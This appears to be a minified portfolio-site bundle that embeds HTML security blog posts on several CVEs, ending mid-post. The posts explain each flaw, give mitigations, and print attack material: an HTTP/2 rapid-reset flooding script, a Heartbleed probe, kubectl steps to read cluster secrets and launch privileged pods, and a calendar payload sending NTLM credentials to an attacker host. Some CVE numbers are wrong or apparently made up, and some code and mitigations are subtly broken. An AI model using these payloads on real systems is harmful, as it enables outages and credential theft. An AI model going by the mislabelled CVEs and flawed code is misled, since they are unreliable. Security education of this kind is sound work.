they work, and their implications for modern cybersecurity.",date:"September 6, 2024",readTime:"6 min read"}];function Ac(){return u.jsxs("div",{className:"hud-workspace",children:[u.jsx(Wn,{title:"Identity // Access Granted",subtitle:"Operator profile",initialSize:{width:1160},children:u.jsx(Mg,{data:Gg})}),u.jsx(Wn,{title:"Experience Feed",subtitle:"roles / capabilities",initialPosition:{x:8,y:0},children:u.jsx(Ug,{items:qg})}),u.jsx(Wn,{title:"Bio + Links",subtitle:"signal",initialPosition:{x:-4,y:0},children:u.jsx(zg,{data:Yg,socials:$g})})]})}function Zg({data:e}){return u.jsx("header",{className:"blog-welcome-section",children:u.jsxs("div",{className:"container text-center",children:[u.jsx("h1",{className:"glitchy","data-text":e.title,children:e.title}),u.jsx("p",{className:"blog-subtitle",children:e.subtitle})]})})}function Jg({posts:e,page:n=1,totalPages:t=1,onPageChange:s}){return u.jsx("section",{className:"blog-list-section",children:u.jsxs("div",{className:"container",children:[e.map(r=>u.jsxs("article",{className:"blog-row",children:[u.jsxs("div",{className:"blog-row-meta",children:[u.jsx("div",{className:"blog-row-date",children:r.date}),u.jsx("div",{className:"blog-row-time",children:r.readTime})]}),u.jsxs("div",{className:"blog-row-body",children:[u.jsx(Ie,{to:r.href,className:"blog-row-title",children:r.title}),u.jsx("p",{className:"blog-row-excerpt",children:r.excerpt}),u.jsx("div",{className:"blog-tags",children:u.jsx("span",{className:"pill",children:"Security"})})]}),u.jsx("div",{className:"blog-row-cta",children:u.jsx(Ie,{to:r.href,className:"view-credentials",children:"Read"})})]},r.title)),t>1&&u.jsxs("div",{className:"blog-pagination",children:[u.jsx("button",{className:"pill",disabled:n===1,onClick:()=>s==null?void 0:s(Math.max(1,n-1)),children:"Previous"}),u.jsxs("span",{className:"blog-page-indicator",children:["Page ",n," of ",t]}),u.jsx("button",{className:"pill",disabled:n===t,onClick:()=>s==null?void 0:s(Math.min(t,n+1)),children:"Next"})]})]})})}function ev({posts:e,onFilter:n}){const[t,s]=b.useState(""),r=b.useMemo(()=>t.trim()?e.filter(a=>a.title.toLowerCase().includes(t.toLowerCase())||a.excerpt.toLowerCase().includes(t.toLowerCase())):e,[t,e]),i=a=>{s(a.target.value),n(r)};return u.jsxs("div",{className:"blog-search",children:[u.jsx("label",{className:"search-label",htmlFor:"blog-search",children:"Search posts"}),u.jsxs("div",{className:"search-shell",children:[u.jsx("i",{className:"fas fa-search search-icon","aria-hidden":"true"}),u.jsx("input",{id:"blog-search",type:"search",value:t,onChange:i,placeholder:"Type a keyword…",className:"search-input"})]})]})}function nv(){const[e,n]=b.useState(Qa),[t,s]=b.useState(1),r=5,i=Math.max(1,Math.ceil(e.length/r)),a=e.slice((t-1)*r,t*r),l=o=>{n(o),s(1)};return u.jsx("div",{className:"hud-workspace",children:u.jsxs(Wn,{title:"Blog Feed",subtitle:"drag / resize",initialSize:{width:1180},children:[u.jsx(Zg,{data:Qg}),u.jsx("div",{className:"container blog-controls",children:u.jsx(ev,{posts:Qa,onFilter:l})}),u.jsx(Jg,{posts:a,page:t,totalPages:i,onPageChange:s})]})})}const tv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–0012: HTTP/2 Rapid Reset Attack Explained</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–0012?</h2>
        <p>
          CVE-2024–0012, known as the HTTP/2 Rapid Reset Attack, was disclosed, affecting major web servers like Apache and Nginx. This denial-of-service (DoS) vulnerability exploits HTTP/2’s stream management system by abusing the RST_STREAM frame. By overwhelming the server with rapid stream resets, attackers can exhaust resources and disrupt services.
        </p>

        <h2>How the Vulnerability Works</h2>
        <h3>HTTP/2 and RST_STREAM</h3>
        <p>
          HTTP/2 allows multiplexing multiple streams over a single connection. The RST_STREAM frame cancels streams when they are no longer needed. However, attackers can send a rapid series of RST_STREAM frames, forcing the server to process and discard streams at an unsustainable rate, leading to resource exhaustion.
        </p>

        <h2>Exploit Code Example</h2>
        <p>
          Below is an educational example in Python that demonstrates how an attacker could exploit this vulnerability using an HTTP/2 library.
        </p>
        <div class="code-block">
          <code>
import h2.connection<br>
import h2.events<br>
import socket<br>
import ssl<br>
import time<br><br>

# Configure target server<br>
TARGET_HOST = "vulnerable-server.com"<br>
TARGET_PORT = 443<br>
STREAM_COUNT = 1000  # Number of streams to abuse<br><br>

def send_reset_attack():<br>
    # Establish SSL/TLS connection<br>
    context = ssl.create_default_context()<br>
    with socket.create_connection((TARGET_HOST, TARGET_PORT)) as raw_sock:<br>
        with context.wrap_socket(raw_sock, server_hostname=TARGET_HOST) as tls_sock:<br>
            # Initialize HTTP/2 connection<br>
            conn = h2.connection.H2Connection()<br>
            conn.initiate_connection()<br>
            tls_sock.sendall(conn.data_to_send())<br><br>

            # Send multiple streams with rapid resets<br>
            for stream_id in range(1, STREAM_COUNT * 2, 2):  # HTTP/2 streams are odd-numbered<br>
                conn.send_headers(<br>
                    stream_id=stream_id,<br>
                    headers=[<br>
                        (":method", "GET"),<br>
                        (":path", "/"),<br>
                        (":authority", TARGET_HOST),<br>
                        (":scheme", "https"),<br>
                    ],<br>
                )<br>
                tls_sock.sendall(conn.data_to_send())<br>
                conn.reset_stream(stream_id)<br>
                tls_sock.sendall(conn.data_to_send())<br>
                print(f"Stream {stream_id} reset sent")<br>
            time.sleep(5)<br><br>

if __name__ == "__main__":<br>
    print(f"Launching HTTP/2 Rapid Reset Attack on {TARGET_HOST}...")<br>
    send_reset_attack()<br>
    print("Attack complete. Check server performance.")<br>
          </code>
        </div>
        <p><strong>Disclaimer:</strong> This code is for educational purposes only. Testing such exploits without proper authorization is unethical and illegal.</p>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Apply Server Patches:</strong> Server vendors like Apache and Nginx have released patches to mitigate this vulnerability. Update your software to the latest version.</li>
          <li><strong>Implement Rate-Limiting:</strong> Use rate-limiting to restrict the number of HTTP/2 streams and resets per connection.</li>
          <li><strong>Monitor Server Metrics:</strong> Deploy monitoring tools to detect unusual spikes in resource usage associated with HTTP/2 traffic.</li>
          <li><strong>Disable HTTP/2 Temporarily:</strong> If patching is not feasible, disable HTTP/2 support as a temporary mitigation:
            <ul>
              <li><strong>For Apache:</strong> Remove <code>h2</code> from the <code>Protocols</code> directive:</li>
              <code>Protocols h2 h2c http/1.1</code>
              <li><strong>For Nginx:</strong> Remove the <code>http2</code> directive from server configurations.</li>
            </ul>
          </li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–0012, or the HTTP/2 Rapid Reset Attack, underscores the importance of securing web servers against denial-of-service attacks. By applying timely patches, implementing rate-limiting, and monitoring server activity, organizations can mitigate this threat and ensure the availability of their services.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,sv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Heartbleed (CVE-2014–0160)</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Heartbleed (CVE-2014–0160)</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>Understanding Heartbleed: A Technical Breakdown</h2>
        <p>
          Heartbleed was a flaw in the heartbeat extension of OpenSSL, a widely used library that provides SSL/TLS encryption. The vulnerability was introduced in OpenSSL version 1.0.1 and persisted until version 1.0.1g. The issue stemmed from improper input validation, allowing an attacker to read arbitrary chunks of server memory, up to 64KB per request.
        </p>

        <h3>Heartbeat Extension Basics</h3>
        <p>
          To maintain secure connections, OpenSSL’s heartbeat mechanism allows clients and servers to verify each other’s presence by sending and receiving “heartbeat” messages. Here’s how the message exchange is supposed to work:
        </p>
        <ol>
          <li>A client sends a heartbeat request containing a payload and specifies the payload length.</li>
          <li>The server echoes the payload back to the client to confirm the connection is still alive.</li>
        </ol>
        <p>
          The vulnerability occurs because the server trusts the client-supplied payload length without verifying it against the actual payload size, leading to memory leaks.
        </p>

        <h3>Simplified Vulnerable Code</h3>
        <div class="code-block">
          <code>
int tls1_process_heartbeat(SSL *s) {<br />
&nbsp;&nbsp;unsigned char *p = &s->s3->rrec.data[0];<br />
&nbsp;&nbsp;unsigned short payload;<br />
&nbsp;&nbsp;unsigned char *buffer, *bp;<br />
&nbsp;&nbsp;payload = (p[0] << 8) | p[1];<br />
&nbsp;&nbsp;buffer = OPENSSL_malloc(1 + 2 + payload + 16);<br />
&nbsp;&nbsp;bp = buffer;<br />
&nbsp;&nbsp;*bp++ = TLS1_HB_RESPONSE;<br />
&nbsp;&nbsp;memcpy(bp, p, payload); // Vulnerable<br />
&nbsp;&nbsp;ssl3_write_bytes(s, TLS1_RT_HEARTBEAT, buffer, 3 + payload);<br />
&nbsp;&nbsp;OPENSSL_free(buffer);<br />
}
          </code>
        </div>

        <h2>How Heartbleed Works</h2>
        <p>
          An attacker can exploit this vulnerability by sending a malicious heartbeat request where the payload length is intentionally larger than the actual payload.
        </p>

        <h3>Exploit Example in Python</h3>
        <div class="code-block">
          <code>
import socket<br />
import struct<br />
def create_heartbeat_request():<br />
&nbsp;&nbsp;hb_type = 1<br />
&nbsp;&nbsp;payload = b"Hi"<br />
&nbsp;&nbsp;payload_length = 0xFFFF<br />
&nbsp;&nbsp;return struct.pack(">BHH", hb_type, len(payload), payload_length) + payload<br />
def send_heartbeat_request(host, port):<br />
&nbsp;&nbsp;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br />
&nbsp;&nbsp;s.connect((host, port))<br />
&nbsp;&nbsp;s.send(create_heartbeat_request())<br />
&nbsp;&nbsp;response = s.recv(65535)<br />
&nbsp;&nbsp;print("Leaked memory:", response)<br />
send_heartbeat_request("example.com", 443)
          </code>
        </div>

        <h2>Global Chaos and Real-World Impact</h2>
        <p>
          The Heartbleed vulnerability affected a significant portion of the internet, with estimates suggesting that 17% of all secure web servers were compromised. Major companies were forced to take immediate action to patch their systems.
        </p>

        <h2>Detecting Heartbleed</h2>
        <p>
          Security tools like Nmap can be used to detect Heartbleed vulnerabilities. Use the following command:
        </p>
        <div class="code-block">
          <code>
nmap -p 443 --script ssl-heartbleed example.com
          </code>
        </div>

        <h2>Lessons Learned</h2>
        <ul>
          <li><strong>Input Validation:</strong> Validate all inputs, especially lengths and buffer sizes.</li>
          <li><strong>Automated Patching Systems:</strong> Ensure systems are regularly updated.</li>
          <li><strong>Memory Safety Practices:</strong> Use memory-safe programming languages like Rust.</li>
        </ul>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,rv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2024–1001: Kubernetes RBAC Misconfiguration</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2024–1001: Kubernetes RBAC Misconfiguration</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2024–1001?</h2>
        <p>
          Kubernetes relies heavily on Role-Based Access Control (RBAC) to manage permissions. However, in early 2024, CVE-2024–1001 was disclosed, revealing how misconfigured RBAC rules in Kubernetes could allow attackers to gain full control over a cluster. This vulnerability emphasizes the risks of poorly defined access policies.
        </p>

        <h3>RBAC in Kubernetes</h3>
        <p>
          RBAC allows administrators to define who can access resources in a Kubernetes cluster and what actions they can perform. Permissions are granted using Roles, Cluster Roles, and Role Bindings.
        </p>

        <h2>The Vulnerability</h2>
        <p>
          CVE-2024–1001 occurs when overly permissive RBAC configurations allow attackers to escalate privileges. Specifically:
        </p>
        <ul>
          <li>Permissions like “create” or “patch” on sensitive resources (e.g., Pods) can be abused.</li>
          <li>Attackers can deploy malicious workloads, extract secrets, or control the cluster API server.</li>
        </ul>

        <h2>Exploit Workflow</h2>
        <h3>RBAC Misconfiguration</h3>
        <div class="code-block">
          <code>
apiVersion: rbac.authorization.k8s.io/v1<br>
kind: Role<br>
metadata:<br>
&nbsp;&nbsp;namespace: vulnerable-namespace<br>
&nbsp;&nbsp;name: overly-permissive-role<br>
rules:<br>
- apiGroups: [""]<br>
&nbsp;&nbsp;resources: ["pods", "secrets"]<br>
&nbsp;&nbsp;verbs: ["get", "create", "patch"]<br>
          </code>
        </div>
        <p>This Role allows anyone bound to it to create and patch Pods and access secrets in the namespace.</p>

        <h3>Step-by-Step Exploit</h3>
        <ol>
          <li><strong>Gain Initial Access:</strong> Assume the attacker has access to a low-privileged service account in the namespace, bound to the misconfigured Role.</li>
          <li><strong>Create a Malicious Pod:</strong> Use the <code>kubectl</code> command to create a Pod with elevated privileges:
            <div class="code-block">
              <code>
kubectl run malicious-pod --image=alpine --restart=Never -- /bin/sh -c "apk add curl; while true; do sleep 3600; done"
              </code>
            </div>
          </li>
          <li><strong>Access Sensitive Secrets:</strong> Once the Pod is running, exec into it:
            <div class="code-block">
              <code>
kubectl exec -it malicious-pod -- /bin/sh<br>
# Inside the Pod:<br>
curl -s -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \\ <br>
https://kubernetes.default.svc/api/v1/namespaces/vulnerable-namespace/secrets
              </code>
            </div>
          </li>
          <li><strong>Escalate Privileges:</strong> Create Pods with privileged containers:
            <div class="code-block">
              <code>
kubectl apply -f - <<EOF<br>
apiVersion: v1<br>
kind: Pod<br>
metadata:<br>
&nbsp;&nbsp;name: root-access-pod<br>
&nbsp;&nbsp;namespace: kube-system<br>
spec:<br>
&nbsp;&nbsp;containers:<br>
&nbsp;&nbsp;- name: root-access-container<br>
&nbsp;&nbsp;&nbsp;&nbsp;image: alpine<br>
&nbsp;&nbsp;&nbsp;&nbsp;securityContext:<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;privileged: true<br>
&nbsp;&nbsp;&nbsp;&nbsp;command: ["/bin/sh", "-c", "while true; do sleep 3600; done"]<br>
EOF
              </code>
            </div>
          </li>
        </ol>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Enforce the Principle of Least Privilege:</strong> Grant only the minimum permissions necessary for users and service accounts to perform their tasks. Avoid broad permissions like “create” or “patch” on sensitive resources.</li>
          <li><strong>Audit RBAC Policies:</strong> Regularly audit your RBAC configurations to identify overly permissive Roles and ClusterRoles:
            <div class="code-block">
              <code>
kubectl get roles,clusterroles,rolebindings,clusterrolebindings --all-namespaces
              </code>
            </div>
          </li>
          <li><strong>Use Pod Security Standards:</strong> Apply Pod Security Standards (PSS) to restrict privileged Pod creation:
            <div class="code-block">
              <code>
apiVersion: policy/v1beta1<br>
kind: PodSecurityPolicy<br>
metadata:<br>
&nbsp;&nbsp;name: restricted<br>
spec:<br>
&nbsp;&nbsp;privileged: false
              </code>
            </div>
          </li>
          <li><strong>Enable Logging and Monitoring:</strong> Monitor for suspicious activities, such as unauthorized Pod creation or access to secrets. Tools like Falco or Kubernetes Audit Logs can help.</li>
          <li><strong>Use Network Policies:</strong> Restrict Pod-to-Pod communication using Kubernetes Network Policies to limit the attack surface.</li>
        </ol>

        <h2>Conclusion</h2>
        <p>
          CVE-2024–1001 underscores the importance of careful RBAC configuration in Kubernetes. Misconfigured permissions can open the door to attackers, allowing them to escalate privileges and take over a cluster. By enforcing least privilege, auditing RBAC policies, and using Pod Security Standards, organizations can safeguard their Kubernetes environments.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,iv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2017–11882: Microsoft Office Memory Corruption Vulnerability</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is CVE-2017–11882?</h2>
        <p>
          CVE-2017–11882 is a critical vulnerability within Microsoft Office’s Equation Editor component. This legacy feature, designed for displaying mathematical equations, contains a memory corruption flaw that lets attackers execute malicious code when users open a specially crafted document. Attackers can exploit this weakness to install malware, steal data, or gain full control over a target system with the same permissions as the user.
        </p>

        <h3>Affected Office Versions:</h3>
        <ul>
          <li>Microsoft Office 2007 (Service Pack 3)</li>
          <li>Microsoft Office 2010 (Service Pack 2)</li>
          <li>Microsoft Office 2013 (Service Pack 1)</li>
          <li>Microsoft Office 2016</li>
        </ul>
        <p>
          Despite being patched in November 2017, the Equation Editor vulnerability remains a key target, with unpatched systems or older Office versions still vulnerable.
        </p>

        <h2>How the Vulnerability Works</h2>
        <p>
          This vulnerability allows remote code execution (RCE) by corrupting memory through Office’s Object Linking and Embedding (OLE) feature when opening a malicious document. Here’s how an attack typically unfolds:
        </p>
        <ol>
          <li><strong>Phishing:</strong> The attacker sends an email with an attachment, like a Word or Excel document, designed to exploit CVE-2017–11882.</li>
          <li><strong>User Action:</strong> The user opens the document, unknowingly triggering malicious code within the Equation Editor.</li>
          <li><strong>System Compromise:</strong> The attacker gains control over the system, potentially installing further malware, stealing sensitive data, or using the compromised system to attack other network resources.</li>
        </ol>

        <h2>Why CVE-2017–11882 Remains a Top Target</h2>
        <p>
          This vulnerability is highly favored by cybercriminals and nation-state hackers from countries like China, Russia, and North Korea. Both the Department of Homeland Security and the FBI have flagged it as a frequently exploited vulnerability. Its persistence can be attributed to:
        </p>
        <ul>
          <li><strong>Ease of Exploitation:</strong> Attackers only need to convince users to open a document, making social engineering attacks highly effective.</li>
          <li><strong>Legacy Code:</strong> The Equation Editor, dating back to 2000, is incompatible with modern Office security features, making it difficult to defend without patching.</li>
          <li><strong>Prevalence of Unpatched Systems:</strong> Many organizations, particularly those with older Office versions, haven’t applied Microsoft’s 2017 patch, leaving them vulnerable.</li>
        </ul>

        <h2>How to Protect Against CVE-2017–11882</h2>
        <p>
          With patches readily available, mitigating CVE-2017–11882 is straightforward, yet it requires proactive security practices. Here’s how organizations can protect themselves:
        </p>
        <ol>
          <li><strong>Update Microsoft Office:</strong> Ensure all Office versions are up-to-date with Microsoft’s security patches. Microsoft’s November 2017 patch addresses CVE-2017–11882 and should be applied immediately to unpatched systems.</li>
          <li><strong>Disable the Equation Editor:</strong> If this feature is unnecessary for your organization, disable it. Doing so removes a significant attack vector.</li>
          <li><strong>Use Modern Endpoint Protection:</strong> Employ advanced endpoint security tools that can detect and block malicious document activity. Many modern security solutions offer protections specifically designed to detect CVE-2017–11882 exploitation.</li>
          <li><strong>User Awareness and Training:</strong> Social engineering plays a significant role in the success of attacks exploiting this vulnerability. Educate users on the risks of opening unknown attachments or clicking links in unsolicited emails.</li>
        </ol>

        <h2>Staying Ahead of Persistent Threats</h2>
        <p>
          The continued exploitation of CVE-2017–11882 underscores the importance of regular patching, user education, and layered security defenses. A vulnerability like this, embedded in software many organizations rely on daily, is a stark reminder that cybersecurity requires constant vigilance.
        </p>
        <p>
          By applying patches, disabling unused features, and maintaining a robust security posture, organizations can effectively protect themselves against even the oldest and most persistent threats in today’s digital landscape. In cybersecurity, diligence, and preparedness are the best defenses against exploitation — whether it’s a vulnerability from yesterday or one that emerges tomorrow.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,av=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">CVE-2023–23397: Microsoft Outlook NTLM Credential Theft</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>How CVE-2023–23397 Works</h2>
        <p>
          The vulnerability exploits how Microsoft Outlook handles reminders and calendar invites. Normally, Outlook processes these items to display notifications and updates. However, in this case, attackers can create a specially crafted message that tricks Outlook into making an outbound connection to a server under the attacker’s control. This connection is made using NTLM authentication, sending the victim’s NTLM credentials and exposing them to potential misuse.
        </p>

        <h3>Exploit Scenario</h3>
        <ol>
          <li>An attacker crafts a malicious email containing a reminder or calendar invite.</li>
          <li>The email specifies a UNC (Universal Naming Convention) path that points to an attacker-controlled server.</li>
          <li>When Outlook receives and processes this email, it automatically tries to access the specified UNC path, triggering NTLM authentication and sending the victim’s credentials to the attacker.</li>
        </ol>

        <h3>Code and Example</h3>
        <div class="code-block">
          <code>
import http.server<br>
import socketserver<br><br>
class MyRequestHandler(http.server.SimpleHTTPRequestHandler):<br>
&nbsp;&nbsp;&nbsp;&nbsp;def do_GET(self):<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f"Received connection from: {self.client_address}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.send_response(200)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.end_headers()<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;self.wfile.write(b"Hello, you've been logged!")<br><br>
PORT = 8000<br>
handler = MyRequestHandler<br>
with socketserver.TCPServer(("", PORT), handler) as httpd:<br>
&nbsp;&nbsp;&nbsp;&nbsp;print(f"Serving on port {PORT}")<br>
&nbsp;&nbsp;&nbsp;&nbsp;httpd.serve_forever()<br>
          </code>
        </div>

        <h3>Malicious Email Payload Example</h3>
        <div class="code-block">
          <code>
BEGIN:VCALENDAR<br>
VERSION:2.0<br>
BEGIN:VEVENT<br>
UID:123456<br>
SUMMARY:Malicious Reminder<br>
DTSTART;TZID=Europe/London:20231105T090000<br>
ATTACH;VALUE=URI:\\\\attacker-controlled-server.com\\malicious\\path<br>
END:VEVENT<br>
END:VCALENDAR<br>
          </code>
        </div>

        <h2>Impact and Risks</h2>
        <ul>
          <li><strong>Credential Theft:</strong> If an attacker successfully captures NTLM credentials, they can use them to authenticate against other systems on the same network, potentially gaining unauthorized access.</li>
          <li><strong>No User Interaction Needed:</strong> The lack of user interaction makes this vulnerability particularly dangerous, as even vigilant users can fall victim without realizing it.</li>
          <li><strong>Enterprise Threat:</strong> Organizations with a large number of Outlook users are especially at risk, as the exploit can be used to pivot through corporate networks.</li>
        </ul>

        <h2>Mitigation Strategies</h2>
        <ol>
          <li><strong>Update Microsoft Outlook:</strong> Microsoft has released patches for this vulnerability. Ensure that all systems are updated to the latest version of Outlook.</li>
          <li><strong>Disable SMB Outbound Traffic:</strong> Blocking outbound SMB traffic at the network perimeter can prevent credentials from being sent to an external server.</li>
          <li><strong>Use Protected Users Group:</strong> Members of this group in Active Directory are protected against NTLM authentication.</li>
          <li><strong>Implement NTLM Blocking Policies:</strong> Where possible, configure policies to restrict NTLM authentication and enforce Kerberos.</li>
        </ol>

        <h3>Defensive Example in PowerShell</h3>
        <div class="code-block">
          <code>
Set-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0" -Name "RestrictSendingNTLMTraffic" -Value "2"
          </code>
        </div>
        <p>
          This command enforces NTLM restrictions, significantly reducing the risk of credential theft.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,lv=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Downfall (CVE-2022–40982): Exploiting Speculative Execution in Intel CPUs</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What is Downfall (CVE-2022–40982)?</h2>
        <p>
          In August 2023, a critical vulnerability, CVE-2022–40982, dubbed Downfall, was disclosed. This vulnerability affects Intel x86–64 processors and exploits speculative execution to access sensitive data stored in vector registers. It impacts both consumer CPUs and server-grade Xeon processors, allowing attackers with local access to bypass security boundaries and potentially extract confidential information like encryption keys or passwords.
        </p>

        <h2>Speculative Execution</h2>
        <p>
